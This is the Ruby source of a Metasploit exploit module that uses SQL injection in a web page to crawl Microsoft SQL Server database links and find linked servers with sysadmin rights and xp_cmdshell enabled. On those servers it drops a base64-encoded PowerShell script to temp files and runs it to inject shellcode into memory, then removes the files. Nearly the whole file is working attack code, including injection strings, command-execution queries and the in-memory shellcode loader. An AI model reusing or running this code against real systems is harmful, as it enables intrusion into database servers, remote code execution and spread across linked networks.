require 'msf/core'
require 'msf/core/exploit/mssql_commands'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking
	
	include Msf::Exploit::Remote::MSSQL_SQLI
	include Msf::Auxiliary::Report
	include Msf::Exploit::CmdStagerVBS

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Microsoft SQL Server - Database Link Crawler',
			'Description'    => %q{
			When provided credentials, this module will crawl SQL Server database links and identify links configured with sysadmin privileges.
			
			Syntax for injection URLs:
			
			Error: /account.asp?id=1+and+1=[SQLi];--
			
			Union: /account.asp?id=1+union+all+select+null,[SQLi],null;--
			Union works most reliably if "id=1" does not return any data, i.e. use "id=12345678"
			
			Blind: /account.asp?id=1;[SQLi];--
			
			The payload deployment works currently only on systems that have powershell.
			},
			'Author'         =>
				[
					'Antti Rantasaari <antti.rantasaari@netspi.com>',  
					'Scott Sutherland "nullbind" <scott.sutherland@netspi.com>'  
				],
			'Platform'      => [ 'Windows' ],
			'License'        => MSF_LICENSE,
			'References'     => [[ 'URL', 'http://www.netspi.com/' ],['URL','http://msdn.microsoft.com/en-us/library/ms188279.aspx']],
			'Version'        => '$Revision: 1 $',
			'DisclosureDate' => 'Jan 1 2000',
			'Targets'        =>
				[
					[ 'Automatic', { } ],
				],
			'DefaultTarget'  => 0
		))

		register_options(
			[	
				OptBool.new('VERBOSE',  [false, 'Set how verbose the output should be', 'false']),
				OptString.new('TYPE', [ true, 'SQLi type (ERROR (works for union too) or BLIND)', 'ERROR']),
				OptString.new('CHARSET', [true, 'Charset used for blind injections', 'default']),
				OptString.new('DELAY', [true, 'Time delay for blind injections - 1-5 seconds', '1']),
				OptBool.new('DEPLOY', [true, 'Deploy a payload on target systems', 'true']),
				OptString.new('DEPLOYLIST',  [false,'Comma seperated list of systems to deploy payload to (blank = all)'])
			], self.class)
	end
	
	def exploit
		masterList = Array.new
		masterList[0] = Hash.new			# Define new hash
		masterList[0]["name"] = ""			# Name of the current database server
		masterList[0]["path"] = [[]]		# Link path used during crawl - all possible link paths stored
		masterList[0]["done"] = 0			# Used to determine if linked need to be crawled	
		
		shelled = Array.new					# keeping track of shelled systems - multiple incoming sa links could result in multiple shells on one system
		
		# Create loot table to store configuration information from crawled database server links
		linked_server_table = Rex::Ui::Text::Table.new(
			'Header'  => 'Linked Server Table',
			'Ident'   => 1,			
			'Columns' => ['db_server', 'path']
		)	
		save_loot = ""
		
		type = datastore['type'].to_s.downcase 	
		
		print_status("----------------------------------------------------")
		print_status("Enumerating name of database server entry point")
		print_status("----------------------------------------------------")
		
		while masterList.any? {|f| f["done"] == 0}
			server = masterList.detect {|f| f["done"] == 0}
			if type=="error"
				execute = "(select @@servername as int)"
				sql = query_builder(server["path"].first,"",0,execute)
				res = mssql_query(sql)
				name = res.body.scan(/startmsf(.*)endmsf/imu).flatten.first
				server["name"] = name unless name == nil
			elsif type=="blind"
				column = "@@servername"
				name = blind_injection(server["path"].first,'name',column)
				server["name"] = name unless name == nil
			end
			
			##########################
			permission_checker(server,masterList,name,type,shelled) unless name == nil
			##########################
			
			# Get number of good links on the server
			count = nil
			if type=="error" and name != nil
				execute = "(select cast(count(srvname) as varchar) from master..sysservers where srvname != @@servername and dataaccess = 1 and srvproduct = 'SQL Server')"	
				sql = query_builder(server["path"].first,"",0,execute)
				res = mssql_query(sql)
				count = res.body.scan(/startmsf(.*)endmsf/imu).flatten.first
			elsif type=="blind" and name !=nil
				column = "srvname"
				if server["name"] != nil
					count = blind_injection(server["path"].first,'linkcount',column) 
				end
			end

			if count != nil
				print_status("----------------------------------------------------")
				print_status("Enumerating linked servers on #{server["name"]}")
				print_status("----------------------------------------------------")
				(1..Integer(count)).each do |i|
					name = nil
					if type=="error"
						execute = "select top 1 srvname from master..sysservers where srvname in (select top " + i.to_s + \
						" srvname from master..sysservers where srvname != @@servername and dataaccess = 1 \
						and srvproduct = 'SQL Server' order by srvname asc) order by srvname desc"
						sql = query_builder(server["path"].first,"",0,execute)
						res = mssql_query(sql)
						name = res.body.scan(/startmsf(.*)endmsf/imu).flatten.first
					elsif type=="blind"
						column = "srvname"
						name = blind_injection(server["path"].first,'name',column,i.to_s)
					end

					if name != nil
						unless masterList.any? {|f| f["name"] == name}
							masterList << add_host(name,server["path"].first)
						else
							(0..masterList.length-1).each do |x|
								if masterList[x]["name"] == name
									masterList[x]["path"] << server["path"].first
									masterList[x]["path"].last << name
									print_status("Alternative path to #{name}: #{masterList.first["name"]} -> #{server["path"].first.join(" -> ")}")
									permission_checker(server,masterList,name,type,shelled)
								else
									break
								end
							end
						end
					end
				end
			end
			server["done"] = 1
		end
	end
	
	#-------------------------------------------------------------------------------------
	# Method to check if xp_cmdshell accessible - if so, calls payload delivery method
	#-------------------------------------------------------------------------------------
	
	def permission_checker(server,masterList,name,type,shelled)
		temppath = Array.new
		server["path"].first.each {|j| temppath << j}
		temppath << name unless temppath.last == name unless server["path"].first.first == nil
		
		# Check if sysadmin
		print("    Checking permissions on #{name}\n")
		sysadmin = "0"
		if type == "error"
			execute = "(select cast(is_srvrolemember('sysadmin') as varchar))"
			sql = query_builder(temppath,"",0,execute)
			res = mssql_query(sql)
			sysadmin = res.body.scan(/startmsf(.*)endmsf/imu).flatten.first
		elsif type == "blind"
			column = "sysadmin"
			sysadmin = blind_injection(temppath,"enabled",column)
		end
		print("    Sysadmin #{sysadmin} on #{masterList.first["name"]} -> #{temppath.join(" -> ")}\n")
		print_good("Hurray!!! Found sysadmin to #{masterList.first["name"]} -> #{temppath.join(" -> ")}") if sysadmin == "1"
		
		# Check if xp_cmdshell enabled
		if sysadmin == "1"
			xpcmdshell = "0"
			if type == "error"
				execute = "(select cast(value_in_use as varchar) FROM  sys.configurations WHERE  name = 'xp_cmdshell')"
				sql = query_builder(temppath,"",0,execute)
				res = mssql_query(sql)
				xpcmdshell = res.body.scan(/startmsf(.*)endmsf/imu).flatten.first
			elsif type == "blind"
				column = "xpcmdshell"
				xpcmdshell = blind_injection(temppath,"enabled",column)
			end
			if xpcmdshell == "1"
				print_good("Xp_cmdshell enabled on #{masterList.first["name"]} -> #{temppath.join(" -> ")}")
				if type == "error" and temppath.first == nil
					print_error("Can't deliver payload to first server over error based injection (due to SQL syntax related to [SQLi] injection point)")
					print_error("Try blind injection or mssql_payload_sqli module")
				else
					unless shelled.include?(name)
						#Deploy to specific target if specified
						datastore['DEPLOYLIST'] = nil if datastore['DEPLOYLIST']==""
						print_status("\t - Checking if #{name} is on the deploy list...") if datastore['DEPLOYLIST'] != nil and datastore["VERBOSE"] == true
						deploylist = datastore['DEPLOYLIST'].upcase.split(',') if datastore['DEPLOYLIST'] != nil
										
						if datastore['DEPLOYLIST'] == nil or deploylist.include? name.upcase
							print_status("\t - #{name} is on the deploy list.") if datastore['DEPLOYLIST'] != nil and datastore["VERBOSE"] == true
							powershell_upload_exec(temppath) if datastore['DEPLOY']
							shelled << name
						else
							print_status("\t - #{name} is NOT on the deploy list, moving on.") and datastore["VERBOSE"] == true
						end
					else
						print_status("Payload already deployed on #{name}")
					end
				end				
			end
		end
	end
	#-------------------------------------------------------------------------------------
	# Method for blind SQL injections 
	# Will fail if targeted server very slow - mssql_query function times out at 5 seconds
	#-------------------------------------------------------------------------------------
	def blind_injection(path,command,column,topcount=false)
		delay = datastore['DELAY']
		delay = 1 if delay.to_i<1 or delay.to_i>5
		if command=="name"
			length = 0
			spot = 1
			name = ""
			# get the length of servername or linked server servername
			print("    Extracting server name length: ") if column == "@@servername"
			print("\n    Extracting linked server name length: ") if column == "srvname"
			(1..100).each do |i|
				execute = "select 1; if(select len((#{column})))=#{i.to_s} begin waitfor delay '0:0:#{delay}' end" if column == "@@servername"
				execute = "select 1; if(select top 1 len(srvname) from master..sysservers where srvname in \
				(select top #{topcount} srvname from master..sysservers where srvname != @@servername and \
				dataaccess = 1 and srvproduct = 'SQL Server' order by srvname asc) order by srvname desc)='#{i.to_s}' \
				begin waitfor delay '0:0:#{delay}' end" if column == "srvname"
				sql = query_builder(path,"",0,execute,true)
				starttime = Time.now
				mssql_query(sql)
				if Time.now - starttime > delay.to_i
					#puts "found length #{i}"
					print("#{i}\n")
					length = i
					break
				end
			end
			
			if length == 0
				print("\n")
				print_error("Found bad link: #{path.last}")
				return nil
			end
			
			return nil if length == 100
			
			# enumerate servername or linked server servername one character at a time
			if datastore['CHARSET'] == 'default'
				charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789.\\/-_#!?*@$%&()"
			elsif
				charset = datastore['CHARSET']
			end
				
			spot = 1
			print("    Extracting server name: ") if column == "@@servername"
			print("    Extracting linked server name: ") if column == "srvname"
			while spot <= length
				charset.each_char do |i|
					execute = "select 1; if(select substring(#{column},#{spot},1))='#{i}' begin waitfor delay '0:0:#{delay}' end" if column == "@@servername"
					execute = "select 1; if(select top 1 substring(srvname,#{spot},1) from master..sysservers \
					where srvname in (select top #{topcount} srvname from master..sysservers where srvname \
					!= @@servername and dataaccess = 1 and srvproduct = 'SQL Server' order by srvname asc) \
					order by srvname desc)='#{i}' begin waitfor delay '0:0:#{delay}' end" if column == "srvname"
					sql = query_builder(path,"",0,execute,true)
					starttime = Time.now
					mssql_query(sql)
					if Time.now - starttime > delay.to_i
						#puts "found!!! #{i}"
						spot = spot+1
						name = name + i
						print i
						break
					end
					if i == charset[-1]
						print("\n")
						print_error("Failed to enumerated server name")
						return nil
					end
				end
			end
			print("\n")
			return name
			
		# check how many linked servers
		elsif command=="linkcount"
			(1..100).each do |i|
				execute = "select 1; if(select count(srvname) from master..sysservers where srvname != @@servername and dataaccess = 1 \
				and srvproduct = 'SQL Server')=#{i} begin waitfor delay '0:0:#{delay}' end"
				sql = query_builder(path,"",0,execute,true)
				starttime = Time.now
				mssql_query(sql)
				if Time.now - starttime > delay.to_i
					print("    Links found: #{i}\n")
					return i
				end
			end
			return nil
			
		# check is sysadmin or xp_cmdshell enabled
		elsif command=="enabled"
			execute = "select 1; if(select is_srvrolemember('sysadmin'))=1 begin waitfor delay '0:0:#{delay}' end" if column == "sysadmin"
			execute = "select 1; if(select cast(value_in_use as varchar) FROM  sys.configurations WHERE  name = 'xp_cmdshell')='1' \
			begin waitfor delay '0:0:#{delay}' end" if column == "xpcmdshell"
			sql = query_builder(path,"",0,execute,true)
			starttime = Time.now
			mssql_query(sql)
			if Time.now - starttime > delay.to_i
				return "1"
			end
			return "0"
		end
	end
	
	#-------------------------------------------------------------------------------------
	# Method that builds nested openquery statements using during crawling
	#-------------------------------------------------------------------------------------
	def query_builder(path,sql,ticks,execute,nowrap=false)
		# Temp used to maintain the original masterList[x]["path"]
		temp = Array.new
		path.each {|i| temp << i}
		# actual query - defined when the function originally called - ticks multiplied
		if path.length == 0
			execute = "(select cast('startmsf'+(" + execute + ")+'endmsf' as int))" if ticks == 0 and nowrap == false
			return execute.gsub("'","'"*2**ticks)
		# openquery generator
		else
			sql = "(select * from openquery(\"" + temp.shift + "\"," + "'"*2**ticks + query_builder(temp,sql,ticks+1,execute) + "'"*2**ticks + "))"
			sql = "(select cast('startmsf'+(" + sql + ")+'endmsf' as int))" if ticks == 0 and nowrap == false
			return sql
		end
	end
	
	#-------------------------------------------------------------------------------------
	# Method for adding new linked database servers to the crawl list
	#-------------------------------------------------------------------------------------
	#def add_host(name,path,parse_results,verbose)
	def add_host(name,path)
		# Used to add new servers to masterList
		server = Hash.new
		server["name"] = name				# Name of the current database server
		temppath = Array.new
		path.each {|i| temppath << i }
		server["path"] = [temppath]
		server["path"].first << name
		server["done"] = 0		
#		parse_results.each {|stuff| 						
#			server["db_user"] = stuff.at(1)
#			server["db_sysadmin"] = stuff.at(2)
#			server["db_version"] =  stuff.at(3)
#			server["db_os"] = stuff.at(4)	
#		}				
		return server
	end
	
	
	#-------------------------------------------------------------------------------------
	# Method to display configuration information
	#-------------------------------------------------------------------------------------
	def show_configs(i,parse_results)
		print_status(" ")
		print_status("Linked Server: #{i}")
		parse_results.each {|stuff|  
			print_status("  o Link user: #{stuff.at(1)}")	 								
			print_status("  o Link privs: #{stuff.at(2)}")							
			print_status("  o Link version: #{stuff.at(3)}") 			
			print_status("  o Link OS: #{stuff.at(4).strip}") 
		}		
	end
	
	
	#-------------------------------------------------------------------------------------
	# Method for generating the report and loot
	#-------------------------------------------------------------------------------------
	def write_to_report(i,server,parse_results,linked_server_table,link_status)
		parse_results.each {|stuff| 						
		
			# Parse server information
			db_link_user = stuff.at(1)
			db_link_sysadmin = stuff.at(2)
			db_link_version =  stuff.at(3)
			db_link_os = stuff.at(4)										
																		
			# Add link server to the reporting array and set link_status to 'up'
			linked_server_table << [server["name"],server["db_version"],server["db_os"],i,db_link_user,db_link_sysadmin,db_link_version,db_link_os,link_status] 
			
			return linked_server_table
		}
	end
	
	#-------------------------------------------------------------------------------------
	# Method that delivers shellcode payload via powershell thread injection
	# Leaves a powershell process running on the target system
	#-------------------------------------------------------------------------------------
	
	def powershell_upload_exec(path)

		# Create powershell script that will inject our shell code 
		# Note: Must start multi/handler and set DisablePayloadHandler
		myscript ="$code = @\"
[DllImport(\"kernel32.dll\")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport(\"kernel32.dll\")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
[DllImport(\"msvcrt.dll\")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);
\"@
$winFunc = Add-Type -memberDefinition $code -Name \"Win32\" -namespace Win32Functions -passthru
[Byte[]]$sc =#{Rex::Text.to_hex(payload.encoded).gsub('\\',',0').sub(',','')}
$size = 0x1000
if ($sc.Length -gt 0x1000) {$size = $sc.Length}
$x=$winFunc::VirtualAlloc(0,0x1000,$size,0x40)
for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)}
$winFunc::CreateThread(0,0,$x,0,0,0)"

		# Unicode encode powershell script
		mytext_uni = Rex::Text.to_unicode(myscript) 

		# Base64 encode unicode		
		mytext_64 = Rex::Text.encode_base64(mytext_uni)

		# Generate random file name
		rand_filename = rand_text_alpha(8)
		var_duplicates = rand_text_alpha(8)

		# Write base64 encode powershell payload to temp file
		# This is written 2500 characters at a time due to xp_cmdshell ruby function limitations	
		# Adding line number tracking to remove duplication from nested link echo commands
		linenum = 0 
		print_status("\t - Writing base64 powershell temp files to %TEMP%\\#{rand_filename} and %TEMP%\\#{var_duplicates}...")
		mytext_64.scan(/.{1,2500}/).each {|part| 
			print_status("adding to file %temp%\\#{rand_filename}: #{part}") if datastore['verbose'].to_s.downcase == "true"
			execute = "select 1; EXEC master..xp_cmdshell 'powershell -C \"Write \"--#{linenum}--#{part}\" >> %TEMP%\\#{rand_filename}\"'"					
			sql = query_builder(path,"",0,execute,true)
			result = mssql_query(sql, false)
			linenum = linenum+1			
		}

		# Display status to user
		print_status("\t - Finished writing %TEMP%\\#{rand_filename}.") if datastore['VERBOSE'] == true
		print_status("\t - Removing duplicate lines from %TEMP%\\#{rand_filename}...") if datastore['VERBOSE'] == true

		# Remove duplicate lines from temp file and write to new file		
		execute = "select 1;exec master..xp_cmdshell 'powershell -C \"gc %TEMP%\\#{rand_filename}| get-unique > %TEMP%\\#{var_duplicates}\"'"
		sql = query_builder(path,"",0,execute,true)
		result = mssql_query(sql, false)

		execute = "select 1;exec master..xp_cmdshell 'powershell -C \"gc %TEMP%\\#{var_duplicates} | Foreach-Object {$_ -replace \\\"--.*--\\\",\\\"\\\"} | Set-Content %TEMP%\\#{rand_filename}\"'"
		sql = query_builder(path,"",0,execute,true)
		result = mssql_query(sql, false)

		print_status("Completed duplicate line removal of %TEMP%\#{rand_filename}.")

		# Generate base64 encoded powershell command we can use noexit and avoid parsing errors
		# If running on 64bit system, 32bit powershell called from syswow64 - path to Powershell on 64bit systems hardcoded
		powershell_cmd =  "$temppath=(gci env:temp).value;$dacode=(gc $temppath\\#{rand_filename}) -join '';if((gci env:processor_identifier).value -like '*64*'){$psbits=\"C:\\windows\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe -noexit -noprofile -encodedCommand $dacode\"} else {$psbits=\"powershell.exe -noexit -noprofile -encodedCommand $dacode\"};iex $psbits"		
		powershell_uni = Rex::Text.to_unicode(powershell_cmd) 
		powershell_base64 = Rex::Text.encode_base64(powershell_uni)
	
		## Setup and execute shellcode with powershell via xp_cmdshell
		execute = "select 1; EXEC master..xp_cmdshell 'powershell -EncodedCommand #{powershell_base64}'"
		sql = query_builder(path,"",0,execute,true)
		result = mssql_query(sql, false)

		# Remove payload data from the target server
		print_status("Removing %TEMP%\\#{rand_filename} and %TEMP%\\#{var_duplicates} from #{path.last}")
		execute = "select 1; EXEC master..xp_cmdshell 'powershell -C \"Remove-Item %TEMP%\\#{rand_filename}\";powershell -C \"Remove-Item %TEMP%\\#{var_duplicates}\"'"
		sql = query_builder(path,"",0,execute,true)
		result = mssql_query(sql,false)
	end
end